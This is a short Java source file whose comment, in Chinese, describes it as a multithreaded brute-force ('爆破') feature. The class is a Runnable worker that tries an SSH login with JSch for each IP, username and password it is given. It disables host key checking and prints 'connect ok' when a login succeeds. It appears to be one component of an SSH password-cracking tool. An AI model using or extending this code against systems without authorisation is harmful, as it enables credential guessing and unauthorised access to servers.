package sample.function.tab.tabTwo;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;

/**
 * @Description: 多线程实现爆破功能$
 * @Author: ifacker
 * @Date: $
 */
public class TabTwoSshThreadPool implements Runnable {

    private String ip;
    private String uName;
    private String passwd;

    public TabTwoSshThreadPool(String ip, String uName, String passwd) {
        this.ip = ip;
        this.uName = uName;
        this.passwd = passwd;
    }

    @Override
    public void run() {
        JSch jSch = new JSch();
        if (ip == null && uName == null && passwd == null) {
            return;
        }
        try {
            Session session = jSch.getSession(uName, ip);
            session.setConfig("StrictHostKeyChecking", "no");
            session.setPassword(passwd);
            session.connect();
            if (session.isConnected()) {
                System.out.println("connect ok");
            }
        } catch (JSchException e) {
            e.printStackTrace();
        }

    }
}
